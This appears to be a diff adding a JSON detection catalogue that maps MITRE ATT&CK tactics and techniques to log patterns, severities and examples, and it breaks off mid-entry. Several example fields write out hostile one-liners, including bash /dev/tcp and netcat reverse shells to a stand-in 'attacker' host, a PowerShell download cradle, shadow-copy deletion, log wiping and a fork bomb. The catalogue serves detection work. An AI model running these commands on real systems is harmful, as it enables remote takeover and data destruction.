@@ -1,0 +1,2108 @@
+{
+  "tactics": [
+    {
+      "id": "TA0001",
+      "name": "Initial Access",
+      "color": "#C0392B",
+      "description": "Techniques for gaining an initial foothold."
+    },
+    {
+      "id": "TA0002",
+      "name": "Execution",
+      "color": "#E8903A",
+      "description": "Techniques for running adversary-controlled code."
+    },
+    {
+      "id": "TA0003",
+      "name": "Persistence",
+      "color": "#B87333",
+      "description": "Techniques for maintaining a foothold."
+    },
+    {
+      "id": "TA0004",
+      "name": "Privilege Escalation",
+      "color": "#7B2D8B",
+      "description": "Techniques for gaining higher permissions."
+    },
+    {
+      "id": "TA0005",
+      "name": "Defense Evasion",
+      "color": "#2D2B6B",
+      "description": "Techniques for avoiding detection."
+    },
+    {
+      "id": "TA0006",
+      "name": "Credential Access",
+      "color": "#4A6FA5",
+      "description": "Techniques for stealing account credentials."
+    },
+    {
+      "id": "TA0007",
+      "name": "Discovery",
+      "color": "#2E8B6E",
+      "description": "Techniques for learning the environment."
+    },
+    {
+      "id": "TA0008",
+      "name": "Lateral Movement",
+      "color": "#C0392B",
+      "description": "Techniques for moving through the environment."
+    },
+    {
+      "id": "TA0009",
+      "name": "Collection",
+      "color": "#E8903A",
+      "description": "Techniques for gathering data."
+    },
+    {
+      "id": "TA0010",
+      "name": "Exfiltration",
+      "color": "#7B2D8B",
+      "description": "Techniques for stealing data."
+    },
+    {
+      "id": "TA0011",
+      "name": "Command & Control",
+      "color": "#2D2B6B",
+      "description": "Techniques for communicating with compromised systems."
+    },
+    {
+      "id": "TA0040",
+      "name": "Impact",
+      "color": "#C0392B",
+      "description": "Techniques for disrupting availability or integrity."
+    }
+  ],
+  "techniques": [
+    {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "TA0001",
+      "severity": "HIGH",
+      "description": "Adversaries exploit weaknesses in internet-facing software.",
+      "log_patterns": [
+        "SQL syntax error",
+        "directory traversal",
+        "LFI attempt",
+        "SSRF",
+        "XXE",
+        "RCE exploit"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1190/",
+      "examples": [
+        "SQLi via login form",
+        "Path traversal in file upload",
+        "Heartbleed/Shellshock exploit"
+      ]
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "TA0001",
+      "severity": "HIGH",
+      "description": "Adversaries obtain and abuse credentials of existing accounts.",
+      "log_patterns": [
+        "login outside hours",
+        "multiple accounts accessed",
+        "credential stuffing",
+        "password spray"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1078/",
+      "examples": [
+        "Compromised service account used to pivot",
+        "Stolen employee credentials from phishing"
+      ]
+    },
+    {
+      "id": "T1566",
+      "name": "Phishing",
+      "tactic": "TA0001",
+      "severity": "HIGH",
+      "description": "Adversaries send phishing messages to gain access.",
+      "log_patterns": [
+        "email attachment exec",
+        "macro enabled",
+        "suspicious link clicked"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1566/",
+      "examples": [
+        "Spearphishing attachment with malicious macro",
+        "Phishing link to credential harvesting page"
+      ]
+    },
+    {
+      "id": "T1133",
+      "name": "External Remote Services",
+      "tactic": "TA0001",
+      "severity": "MEDIUM",
+      "description": "Abuse of external VPN, RDP, Citrix for initial access.",
+      "log_patterns": [
+        "VPN login anomaly",
+        "RDP from unusual country",
+        "Citrix access"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1133/",
+      "examples": [
+        "VPN login from Tor exit node",
+        "RDP brute force from external IP"
+      ]
+    },
+    {
+      "id": "T1059",
+      "name": "Command and Scripting Interpreter",
+      "tactic": "TA0002",
+      "severity": "HIGH",
+      "description": "Adversaries abuse command-line interpreters to execute commands.",
+      "log_patterns": [
+        "bash -i",
+        "powershell -enc",
+        "cmd.exe /c",
+        "python -c",
+        "perl -e"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1059/",
+      "examples": [
+        "PowerShell download cradle",
+        "Bash reverse shell",
+        "Python one-liner execution"
+      ]
+    },
+    {
+      "id": "T1053",
+      "name": "Scheduled Task/Job",
+      "tactic": "TA0002",
+      "severity": "MEDIUM",
+      "description": "Abuse of task schedulers for execution.",
+      "log_patterns": [
+        "crontab -e",
+        "schtasks /create",
+        "at command",
+        "cron job modified"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1053/",
+      "examples": [
+        "Malicious cron job added to /etc/cron.d",
+        "Windows scheduled task for persistence"
+      ]
+    },
+    {
+      "id": "T1204",
+      "name": "User Execution",
+      "tactic": "TA0002",
+      "severity": "MEDIUM",
+      "description": "Adversaries rely on users to execute malicious content.",
+      "log_patterns": [
+        "macro executed",
+        "double-clicked attachment",
+        "user ran script"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1204/",
+      "examples": [
+        "User opens malicious Excel with macro",
+        "User executes fake update installer"
+      ]
+    },
+    {
+      "id": "T1543",
+      "name": "Create or Modify System Process",
+      "tactic": "TA0003",
+      "severity": "HIGH",
+      "description": "Create or modify services/daemons for persistence.",
+      "log_patterns": [
+        "systemctl enable",
+        "service install",
+        "init.d modified",
+        "LaunchDaemon"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1543/",
+      "examples": [
+        "Malicious systemd service installed",
+        "LaunchDaemon plist added on macOS"
+      ]
+    },
+    {
+      "id": "T1547",
+      "name": "Boot or Logon Autostart Execution",
+      "tactic": "TA0003",
+      "severity": "HIGH",
+      "description": "Configure system to run a program at startup.",
+      "log_patterns": [
+        "HKLM\\Run registry",
+        "startup folder write",
+        "rc.local modified",
+        "bashrc modified"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1547/",
+      "examples": [
+        "Registry Run key persistence",
+        "Malware added to /etc/rc.local"
+      ]
+    },
+    {
+      "id": "T1136",
+      "name": "Create Account",
+      "tactic": "TA0003",
+      "severity": "HIGH",
+      "description": "Adversaries create an account to maintain access.",
+      "log_patterns": [
+        "useradd",
+        "adduser",
+        "net user /add",
+        "new local account"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1136/",
+      "examples": [
+        "Backdoor user created with UID 0",
+        "Hidden admin account via net user"
+      ]
+    },
+    {
+      "id": "T1098",
+      "name": "Account Manipulation",
+      "tactic": "TA0003",
+      "severity": "MEDIUM",
+      "description": "Manipulate accounts to maintain access.",
+      "log_patterns": [
+        "usermod -aG sudo",
+        "passwd changed",
+        "SSH key added",
+        "account expiry removed"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1098/",
+      "examples": [
+        "Attacker added themselves to sudoers",
+        "SSH authorized_keys modified for persistence"
+      ]
+    },
+    {
+      "id": "T1548",
+      "name": "Abuse Elevation Control Mechanism",
+      "tactic": "TA0004",
+      "severity": "CRITICAL",
+      "description": "Bypass elevation mechanisms to gain higher privileges.",
+      "log_patterns": [
+        "sudo -i",
+        "polkit exploit",
+        "pkexec",
+        "UAC bypass",
+        "setuid binary"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1548/",
+      "examples": [
+        "CVE-2021-4034 pkexec exploit",
+        "Sudo token abuse",
+        "SUID binary exploitation"
+      ]
+    },
+    {
+      "id": "T1055",
+      "name": "Process Injection",
+      "tactic": "TA0004",
+      "severity": "CRITICAL",
+      "description": "Inject code into running processes to escalate privileges.",
+      "log_patterns": [
+        "ptrace ATTACH",
+        "WriteProcessMemory",
+        "dll injection",
+        "mmap exec",
+        "LD_PRELOAD"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1055/",
+      "examples": [
+        "Reflective DLL injection",
+        "LD_PRELOAD hijacking on Linux",
+        "Process hollowing"
+      ]
+    },
+    {
+      "id": "T1068",
+      "name": "Exploitation for Privilege Escalation",
+      "tactic": "TA0004",
+      "severity": "CRITICAL",
+      "description": "Exploit software vulnerabilities for privilege escalation.",
+      "log_patterns": [
+        "kernel exploit",
+        "CVE",
+        "privilege escalation attempt",
+        "segfault PID"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1068/",
+      "examples": [
+        "Dirty COW (CVE-2016-5195)",
+        "PrintNightmare exploit",
+        "DirtyCred"
+      ]
+    },
+    {
+      "id": "T1562",
+      "name": "Impair Defenses",
+      "tactic": "TA0005",
+      "severity": "HIGH",
+      "description": "Adversaries disable or modify defensive tools.",
+      "log_patterns": [
+        "antivirus stopped",
+        "firewall disabled",
+        "auditd stopped",
+        "av killed",
+        "iptables flush"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1562/",
+      "examples": [
+        "systemctl stop clamav",
+        "ufw disable",
+        "kill process avd",
+        "iptables -F"
+      ]
+    },
+    {
+      "id": "T1070",
+      "name": "Indicator Removal",
+      "tactic": "TA0005",
+      "severity": "HIGH",
+      "description": "Delete artifacts to cover tracks.",
+      "log_patterns": [
+        "history -c",
+        "rm -rf /var/log",
+        "log cleared",
+        "shred -u",
+        "vssadmin delete"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1070/",
+      "examples": [
+        "bash history cleared",
+        "Auth logs deleted",
+        "Shadow copies deleted before ransomware"
+      ]
+    },
+    {
+      "id": "T1036",
+      "name": "Masquerading",
+      "tactic": "TA0005",
+      "severity": "MEDIUM",
+      "description": "Manipulate process names to evade detection.",
+      "log_patterns": [
+        "process name mismatch",
+        "binary renamed",
+        "svchost.exe in wrong path",
+        "lsass copy"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1036/",
+      "examples": [
+        "Malware named svchost.exe in /tmp",
+        "Renamed nc to sshd",
+        "Python script named cron"
+      ]
+    },
+    {
+      "id": "T1027",
+      "name": "Obfuscated Files or Information",
+      "tactic": "TA0005",
+      "severity": "MEDIUM",
+      "description": "Make content difficult to discover or analyze.",
+      "log_patterns": [
+        "base64 decode",
+        "powershell -enc",
+        "gzip payload",
+        "XOR encoded"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1027/",
+      "examples": [
+        "Base64-encoded PowerShell payload",
+        "XOR-encoded shellcode",
+        "Packed UPX binary"
+      ]
+    },
+    {
+      "id": "T1110",
+      "name": "Brute Force",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Try many passwords to gain access to accounts.",
+      "log_patterns": [
+        "authentication failure",
+        "failed password",
+        "maxretry exceeded",
+        "account locked",
+        "brute force"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1110/",
+      "examples": [
+        "SSH password brute force",
+        "RDP credential stuffing",
+        "IMAP brute force via Hydra"
+      ]
+    },
+    {
+      "id": "T1003",
+      "name": "OS Credential Dumping",
+      "tactic": "TA0006",
+      "severity": "CRITICAL",
+      "description": "Dump credentials from OS and software.",
+      "log_patterns": [
+        "/etc/shadow read",
+        "mimikatz",
+        "lsass dump",
+        "SAM database",
+        "ntds.dit"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1003/",
+      "examples": [
+        "Mimikatz sekurlsa::logonpasswords",
+        "proc/mem read of lsass",
+        "Copying /etc/shadow"
+      ]
+    },
+    {
+      "id": "T1555",
+      "name": "Credentials from Password Stores",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Collect credentials from password managers.",
+      "log_patterns": [
+        "keychain access",
+        "browser password export",
+        "credential manager",
+        "pass store read"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1555/",
+      "examples": [
+        "Chrome password database extracted",
+        "macOS keychain dump",
+        "KeePass master password hook"
+      ]
+    },
+    {
+      "id": "T1040",
+      "name": "Network Sniffing",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Capture network traffic to obtain credentials.",
+      "log_patterns": [
+        "tcpdump",
+        "wireshark",
+        "pcap capture",
+        "promiscuous mode",
+        "arp poison"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1040/",
+      "examples": [
+        "tcpdump on eth0 capturing credentials",
+        "ARP poisoning for MitM",
+        "Passive Wi-Fi capture"
+      ]
+    },
+    {
+      "id": "T1046",
+      "name": "Network Service Discovery",
+      "tactic": "TA0007",
+      "severity": "MEDIUM",
+      "description": "Scan victim network for active services and open ports.",
+      "log_patterns": [
+        "nmap",
+        "port scan",
+        "SYN scan",
+        "masscan",
+        "service enumeration",
+        "65535 ports"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1046/",
+      "examples": [
+        "nmap -sV full port scan",
+        "masscan for rapid enumeration",
+        "NetDiscover for host discovery"
+      ]
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "TA0007",
+      "severity": "LOW",
+      "description": "Get information about running processes.",
+      "log_patterns": [
+        "ps aux",
+        "tasklist",
+        "/proc enumeration",
+        "procfs read"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1057/",
+      "examples": [
+        "ps aux piped to file",
+        "tasklist /v on Windows",
+        "Reading /proc for process tree"
+      ]
+    },
+    {
+      "id": "T1018",
+      "name": "Remote System Discovery",
+      "tactic": "TA0007",
+      "severity": "MEDIUM",
+      "description": "Get a list of other systems on the network.",
+      "log_patterns": [
+        "arp -a",
+        "ping sweep",
+        "net view",
+        "nbtscan",
+        "host discovery"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1018/",
+      "examples": [
+        "arp -a for local network hosts",
+        "Ping sweep with fping",
+        "net view for Windows shares"
+      ]
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "TA0007",
+      "severity": "LOW",
+      "description": "Attempt to get system info like OS version and hardware.",
+      "log_patterns": [
+        "uname -a",
+        "systeminfo",
+        "hostname",
+        "cat /etc/os-release",
+        "lscpu"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1082/",
+      "examples": [
+        "uname -a revealing kernel version",
+        "systeminfo dump via PowerShell",
+        "/etc/issue read for OS fingerprinting"
+      ]
+    },
+    {
+      "id": "T1021",
+      "name": "Remote Services",
+      "tactic": "TA0008",
+      "severity": "HIGH",
+      "description": "Use legitimate remote access protocols for lateral movement.",
+      "log_patterns": [
+        "SSH from unusual source",
+        "RDP lateral",
+        "psexec",
+        "winrm",
+        "lateral movement"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1021/",
+      "examples": [
+        "SSH hopping between internal hosts",
+        "PsExec for remote command execution",
+        "WinRM for lateral movement"
+      ]
+    },
+    {
+      "id": "T1210",
+      "name": "Exploitation of Remote Services",
+      "tactic": "TA0008",
+      "severity": "CRITICAL",
+      "description": "Exploit remote services to gain access to other systems.",
+      "log_patterns": [
+        "exploit remote",
+        "EternalBlue",
+        "CVE",
+        "SMB vulnerability",
+        "RCE remote"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1210/",
+      "examples": [
+        "EternalBlue SMB exploit",
+        "BlueKeep RDP RCE",
+        "Log4Shell remote exploitation"
+      ]
+    },
+    {
+      "id": "T1534",
+      "name": "Internal Spearphishing",
+      "tactic": "TA0008",
+      "severity": "HIGH",
+      "description": "Use internal accounts to phish other employees.",
+      "log_patterns": [
+        "internal email suspicious",
+        "phishing from internal",
+        "compromised account email"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1534/",
+      "examples": [
+        "Compromised HR account sending malicious attachments",
+        "Internal Teams message with malicious link"
+      ]
+    },
+    {
+      "id": "T1560",
+      "name": "Archive Collected Data",
+      "tactic": "TA0009",
+      "severity": "MEDIUM",
+      "description": "Archive data before exfiltration.",
+      "log_patterns": [
+        "tar czf",
+        "zip -r",
+        "7z a",
+        "rar compress",
+        "archive created large"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1560/",
+      "examples": [
+        "tar of /etc compressed to /tmp",
+        "7z archive of database dump",
+        "Encrypted zip of sensitive files"
+      ]
+    },
+    {
+      "id": "T1005",
+      "name": "Data from Local System",
+      "tactic": "TA0009",
+      "severity": "MEDIUM",
+      "description": "Search and collect files from the local system.",
+      "log_patterns": [
+        "find / -name",
+        "grep -r password",
+        "locate *.conf",
+        "mass file read"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1005/",
+      "examples": [
+        "find / -name '*.pem' executed",
+        "grep -r 'password' in /etc",
+        "locate *.kdbx for KeePass databases"
+      ]
+    },
+    {
+      "id": "T1074",
+      "name": "Data Staged",
+      "tactic": "TA0009",
+      "severity": "MEDIUM",
+      "description": "Stage data to a central location before exfiltration.",
+      "log_patterns": [
+        "large file /tmp",
+        "staging directory",
+        "unusual large write",
+        "data aggregation"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1074/",
+      "examples": [
+        "Large tar.gz in /tmp before scp",
+        "Database dump staged in web root",
+        "Data staged in cloud storage before exfil"
+      ]
+    },
+    {
+      "id": "T1041",
+      "name": "Exfiltration Over C2 Channel",
+      "tactic": "TA0010",
+      "severity": "CRITICAL",
+      "description": "Exfiltrate data over command and control channel.",
+      "log_patterns": [
+        "outbound C2",
+        "large upload",
+        "data exfiltration",
+        "unusual egress",
+        "curl POST large"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1041/",
+      "examples": [
+        "curl POST of database to attacker C2",
+        "Encoded data in DNS queries",
+        "HTTPS exfiltration to known bad IP"
+      ]
+    },
+    {
+      "id": "T1048",
+      "name": "Exfiltration Over Alternative Protocol",
+      "tactic": "TA0010",
+      "severity": "HIGH",
+      "description": "Steal data using a different protocol than C2.",
+      "log_patterns": [
+        "FTP upload",
+        "ICMP large",
+        "DNS exfiltration",
+        "SMTP attachment out",
+        "steganography"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1048/",
+      "examples": [
+        "Data exfiltrated via DNS TXT records",
+        "ICMP tunnelling for data exfil",
+        "FTP upload of database to external server"
+      ]
+    },
+    {
+      "id": "T1071",
+      "name": "Application Layer Protocol",
+      "tactic": "TA0011",
+      "severity": "HIGH",
+      "description": "Use application layer protocols for C2 communication.",
+      "log_patterns": [
+        "C2 traffic HTTP",
+        "beacon",
+        "periodic request",
+        "domain fronting",
+        "known malware domain"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1071/",
+      "examples": [
+        "Cobalt Strike HTTP beacon",
+        "DNS C2 with encoded commands",
+        "HTTPS C2 via domain fronting through CDN"
+      ]
+    },
+    {
+      "id": "T1095",
+      "name": "Non-Application Layer Protocol",
+      "tactic": "TA0011",
+      "severity": "HIGH",
+      "description": "Use non-application layer protocols for C2.",
+      "log_patterns": [
+        "ICMP tunnel",
+        "raw socket",
+        "port 4444",
+        "raw TCP C2",
+        "unusual protocol"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1095/",
+      "examples": [
+        "ICMP shell (icmpsh)",
+        "Raw TCP reverse shell on port 4444",
+        "UDP-based C2 communication"
+      ]
+    },
+    {
+      "id": "T1572",
+      "name": "Protocol Tunneling",
+      "tactic": "TA0011",
+      "severity": "HIGH",
+      "description": "Tunnel C2 traffic through a legitimate protocol.",
+      "log_patterns": [
+        "DNS tunnel",
+        "HTTP tunnel",
+        "SSH tunnel",
+        "chisel",
+        "ngrok"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1572/",
+      "examples": [
+        "dnscat2 DNS tunnelling",
+        "chisel SOCKS tunnel",
+        "SSH -R reverse tunnel"
+      ]
+    },
+    {
+      "id": "T1486",
+      "name": "Data Encrypted for Impact",
+      "tactic": "TA0040",
+      "severity": "CRITICAL",
+      "description": "Encrypt data on target systems to interrupt availability.",
+      "log_patterns": [
+        "mass file rename",
+        "encrypted extension",
+        "vssadmin delete",
+        "ransom note",
+        "bcdedit recovery"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1486/",
+      "examples": [
+        "WannaCry ransomware encryption",
+        "LockBit 3.0 file encryption",
+        "REvil ransomware with .REvil extension"
+      ]
+    },
+    {
+      "id": "T1490",
+      "name": "Inhibit System Recovery",
+      "tactic": "TA0040",
+      "severity": "CRITICAL",
+      "description": "Delete or disable backups to prevent recovery.",
+      "log_patterns": [
+        "vssadmin delete shadows",
+        "wbadmin delete",
+        "bcdedit",
+        "backup deletion",
+        "shadow copy removed"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1490/",
+      "examples": [
+        "vssadmin.exe delete shadows /all /quiet",
+        "wbadmin delete catalog",
+        "Disabling Windows Recovery via bcdedit"
+      ]
+    },
+    {
+      "id": "T1498",
+      "name": "Network Denial of Service",
+      "tactic": "TA0040",
+      "severity": "CRITICAL",
+      "description": "Perform DoS attacks to degrade or block resource availability.",
+      "log_patterns": [
+        "DDoS",
+        "SYN flood",
+        "UDP flood",
+        "amplification attack",
+        "connection flood",
+        "rate 10000/s"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1498/",
+      "examples": [
+        "SYN flood from botnet",
+        "DNS amplification DDoS",
+        "HTTP flood 100k req/s"
+      ]
+    },
+    {
+      "id": "T1499",
+      "name": "Endpoint Denial of Service",
+      "tactic": "TA0040",
+      "severity": "HIGH",
+      "description": "Perform DoS against individual endpoints or applications.",
+      "log_patterns": [
+        "resource exhaustion",
+        "OOM killer",
+        "fork bomb",
+        "CPU spike",
+        "memory exhaustion"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1499/",
+      "examples": [
+        "Fork bomb :(){ :|:& };:",
+        "OOM killer killing critical service",
+        "Application-layer resource exhaustion"
+      ]
+    },
+    {
+      "id": "T1565",
+      "name": "Data Manipulation",
+      "tactic": "TA0040",
+      "severity": "HIGH",
+      "description": "Manipulate data to impact business or operational processes.",
+      "log_patterns": [
+        "database modified",
+        "file checksum mismatch",
+        "data integrity",
+        "unauthorized write",
+        "tampered log"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1565/",
+      "examples": [
+        "Financial record alteration",
+        "Log file tampering",
+        "Database record modification for fraud"
+      ]
+    },
+    {
+      "id": "T1195",
+      "name": "Supply Chain Compromise",
+      "tactic": "TA0001",
+      "severity": "CRITICAL",
+      "description": "Manipulate products or delivery mechanisms before delivery.",
+      "log_patterns": [
+        "package checksum fail",
+        "npm install anomaly",
+        "pip package suspicious",
+        "build system access"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1195/",
+      "examples": [
+        "SolarWinds Orion backdoor",
+        "Malicious npm package",
+        "Compromised build pipeline (XcodeGhost)"
+      ]
+    },
+    {
+      "id": "T1176",
+      "name": "Browser Extensions",
+      "tactic": "TA0003",
+      "severity": "MEDIUM",
+      "description": "Abuse browser extensions for persistence.",
+      "log_patterns": [
+        "browser extension install",
+        "chrome extension",
+        "firefox addon",
+        "browser profile modified"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1176/",
+      "examples": [
+        "Malicious Chrome extension for credential theft",
+        "Firefox addon that proxies traffic",
+        "Extension that exfiltrates browsing history"
+      ]
+    },
+    {
+      "id": "T1185",
+      "name": "Browser Session Hijacking",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Steal cookies to hijack authenticated browser sessions.",
+      "log_patterns": [
+        "cookie theft",
+        "session token stolen",
+        "browser memory read",
+        "cookie exfiltrated"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1185/",
+      "examples": [
+        "Malware steals Chrome cookies",
+        "Pass-the-cookie attack on SSO",
+        "XSS for session token theft"
+      ]
+    },
+    {
+      "id": "T1557",
+      "name": "Adversary-in-the-Middle",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Position between victim and legitimate resource to intercept traffic.",
+      "log_patterns": [
+        "ARP spoofing",
+        "SSL strip",
+        "MitM",
+        "certificate mismatch",
+        "traffic interception"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1557/",
+      "examples": [
+        "ARP poisoning for network MitM",
+        "SSL stripping on unencrypted hop",
+        "Evil twin Wi-Fi access point"
+      ]
+    },
+    {
+      "id": "T1119",
+      "name": "Automated Collection",
+      "tactic": "TA0009",
+      "severity": "MEDIUM",
+      "description": "Use automated techniques to collect data.",
+      "log_patterns": [
+        "automated scrape",
+        "scheduled collection",
+        "cron data harvest",
+        "script bulk read"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1119/",
+      "examples": [
+        "Automated PowerShell script collecting docs",
+        "Cron job harvesting database records",
+        "Spider crawling internal wiki"
+      ]
+    },
+    {
+      "id": "T1567",
+      "name": "Exfiltration to Cloud Storage",
+      "tactic": "TA0010",
+      "severity": "HIGH",
+      "description": "Exfiltrate data to a cloud storage service.",
+      "log_patterns": [
+        "aws s3 cp",
+        "gsutil cp",
+        "rclone upload",
+        "OneDrive upload anomaly",
+        "Dropbox upload large"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1567/",
+      "examples": [
+        "rclone sync to attacker S3 bucket",
+        "megaupload of database dump",
+        "Dropbox API used to exfiltrate data"
+      ]
+    },
+    {
+      "id": "T1664",
+      "name": "Exploitation for Initial Access",
+      "tactic": "TA0001",
+      "severity": "CRITICAL",
+      "description": "Exploit vulnerabilities in public software for initial foothold.",
+      "log_patterns": [
+        "RCE exploit",
+        "log4shell",
+        "spring4shell",
+        "zero-day",
+        "CVE exploit"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1664/",
+      "examples": [
+        "Log4Shell (CVE-2021-44228)",
+        "Spring4Shell RCE",
+        "Apache Struts RCE exploit"
+      ]
+    },
+    {
+      "id": "T1600",
+      "name": "Weaken Encryption",
+      "tactic": "TA0005",
+      "severity": "HIGH",
+      "description": "Reduce key size or disable encryption to enable later exploitation.",
+      "log_patterns": [
+        "weak cipher selected",
+        "TLS 1.0 fallback",
+        "export cipher",
+        "null cipher negotiated"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1600/",
+      "examples": [
+        "FREAK attack forcing export ciphers",
+        "BEAST attack on TLS 1.0",
+        "DROWN attack downgrading to SSLv2"
+      ]
+    },
+    {
+      "id": "T1588",
+      "name": "Obtain Capabilities",
+      "tactic": "TA0042",
+      "severity": "MEDIUM",
+      "description": "Adversaries buy, steal, or download tools for operations.",
+      "log_patterns": [
+        "hacking tool download",
+        "exploit kit",
+        "metasploit",
+        "cobalt strike",
+        "C2 framework"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1588/",
+      "examples": [
+        "Cobalt Strike beacon deployed",
+        "Metasploit framework used",
+        "Commercial RAT purchased on dark web"
+      ]
+    },
+    {
+      "id": "T1222",
+      "name": "File and Directory Permissions Modification",
+      "tactic": "TA0005",
+      "severity": "MEDIUM",
+      "description": "Modify file permissions to maintain access or evade defenses.",
+      "log_patterns": [
+        "chmod 777",
+        "chown root",
+        "setuid set",
+        "world-writable",
+        "ACL modified"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1222/",
+      "examples": [
+        "chmod +s on bash for SUID persistence",
+        "chown root:root on attacker binary",
+        "ACL modification for file access"
+      ]
+    },
+    {
+      "id": "T1124",
+      "name": "System Time Discovery",
+      "tactic": "TA0007",
+      "severity": "LOW",
+      "description": "Get system time for scheduling or evading time-based defenses.",
+      "log_patterns": [
+        "date command",
+        "timedatectl",
+        "GetSystemTime",
+        "ntp query"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1124/",
+      "examples": [
+        "date executed before scheduled malware",
+        "time-based evasion checking business hours",
+        "NTP query to verify timezone"
+      ]
+    },
+    {
+      "id": "T1613",
+      "name": "Container and Resource Discovery",
+      "tactic": "TA0007",
+      "severity": "MEDIUM",
+      "description": "Enumerate container environments like Docker and Kubernetes.",
+      "log_patterns": [
+        "kubectl get pods",
+        "docker ps",
+        "k8s API access",
+        "container escape",
+        "cgroup"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1613/",
+      "examples": [
+        "kubectl enumeration of cluster",
+        "Docker socket abuse for container escape",
+        "Kubernetes API server unauthorized access"
+      ]
+    },
+    {
+      "id": "T1610",
+      "name": "Deploy Container",
+      "tactic": "TA0002",
+      "severity": "HIGH",
+      "description": "Deploy a container to facilitate execution.",
+      "log_patterns": [
+        "docker run --privileged",
+        "kubectl create",
+        "container deploy",
+        "new container spawned"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1610/",
+      "examples": [
+        "Privileged Docker container deployed for host escape",
+        "Malicious Kubernetes pod created",
+        "Container with hostPath mount for persistence"
+      ]
+    },
+    {
+      "id": "T1496",
+      "name": "Resource Hijacking",
+      "tactic": "TA0040",
+      "severity": "MEDIUM",
+      "description": "Leverage system resources for mining or other abuse.",
+      "log_patterns": [
+        "cryptominer",
+        "high CPU",
+        "xmrig",
+        "monero",
+        "GPU spike",
+        "mining process"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1496/",
+      "examples": [
+        "XMRig cryptominer deployed",
+        "Cloud VM hijacked for GPU mining",
+        "Kubernetes cluster resource hijacking for monero"
+      ]
+    },
+    {
+      "id": "T1059.001",
+      "name": "PowerShell",
+      "tactic": "TA0002",
+      "severity": "HIGH",
+      "description": "Adversaries abuse PowerShell for execution.",
+      "log_patterns": [
+        "powershell -enc",
+        "IEX",
+        "Invoke-Expression",
+        "bypass execution",
+        "DownloadString"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1059/001/",
+      "examples": [
+        "PowerShell download cradle IEX(New-Object Net.WebClient).DownloadString",
+        "Encoded PowerShell payload",
+        "AMSI bypass via PowerShell reflection"
+      ]
+    },
+    {
+      "id": "T1059.004",
+      "name": "Unix Shell",
+      "tactic": "TA0002",
+      "severity": "HIGH",
+      "description": "Adversaries abuse Unix shells for execution.",
+      "log_patterns": [
+        "bash -i",
+        "sh -c",
+        "nc reverse shell",
+        "bash /dev/tcp",
+        "shell spawned"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1059/004/",
+      "examples": [
+        "bash -i >& /dev/tcp/attacker/4444 0>&1",
+        "nc -e /bin/sh attacker 4444",
+        "Python pty spawn"
+      ]
+    },
+    {
+      "id": "T1078.003",
